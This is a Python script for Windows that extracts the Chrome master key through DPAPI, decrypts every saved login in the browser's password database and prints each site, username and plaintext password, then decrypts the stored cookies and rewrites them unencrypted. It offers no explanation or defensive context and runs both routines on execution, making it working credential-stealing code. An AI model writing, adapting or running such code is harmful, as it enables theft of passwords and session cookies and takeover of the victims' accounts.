import os, json, base64, sqlite3, shutil
# pip install pycryptodome
from Crypto.Cipher import AES
from ctypes import windll, byref, cdll, Structure, POINTER, c_char, c_buffer
from ctypes.wintypes import DWORD

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', DWORD),
        ('pbData', POINTER(c_char))
    ]

def Win32CryptUnprotectData(encrypted_bytes):
    cbDataIn = len(encrypted_bytes)
    pbDataIn = c_buffer(encrypted_bytes, cbDataIn)
    DataIn = DATA_BLOB(cbDataIn, pbDataIn)
    DataOut = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(DataIn), None, None, None, None, 0x01, byref(DataOut)):
        cbData = int(DataOut.cbData)
        pbData = DataOut.pbData
        buffer = c_buffer(cbData)
        cdll.msvcrt.memcpy(buffer, pbData, cbData)
        windll.kernel32.LocalFree(pbData);
        return buffer.raw
    else:
        raise WindowsError("CryptUnprotectData return FALSE")

chrome_profile = os.environ['USERPROFILE'] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"

def get_master_key(fn = "..\\Local State"):
    try:
        with open(chrome_profile + fn, encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return Win32CryptUnprotectData(encrypted_master_key)
    except:
        return None

def UnprotectData(buffer, master_key):
    try:
        return Win32CryptUnprotectData(buffer).decode('utf-8')
    except:
        iv = buffer[3:15]
        payload = buffer[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode('utf-8')

def decrypt_logindb(fn = "Login Data"):
    if os.path.exists(fn): os.remove(fn)
    shutil.copy(chrome_profile + fn, fn)
    db = sqlite3.connect(fn)
    cursor = db.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    master_key = get_master_key()
    logins = []
    for r in cursor.fetchall():
        try:
            logins.append((r[0], r[1], UnprotectData(r[2], master_key)))
        except Exception as e:
            pass
    for l in logins:
        if l != ('', '', ''):
            print("<%s> <%s> <%s>" % (l[0], l[1], l[2]))
    cursor.close()
    db.close()

def decrypt_cookiedb(fn = "Cookies"):
    if os.path.exists(fn): os.remove(fn)
    shutil.copy(chrome_profile + fn, fn)
    db = sqlite3.connect(fn)
    cursor = db.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    master_key = get_master_key()
    cookies = []
    for r in cursor.fetchall():
        try:
            cookies.append((r[0], r[1], UnprotectData(r[2], master_key)))
        except Exception as e:
            traceback.print_exc()
    for c in cookies:
        cursor.execute("UPDATE cookies set value = ?, encrypted_value = '' where host_key = ? and name = ?", (c[2], c[0], c[1]))
    db.commit()
    cursor.close()
    db.close()

decrypt_logindb()
decrypt_cookiedb()
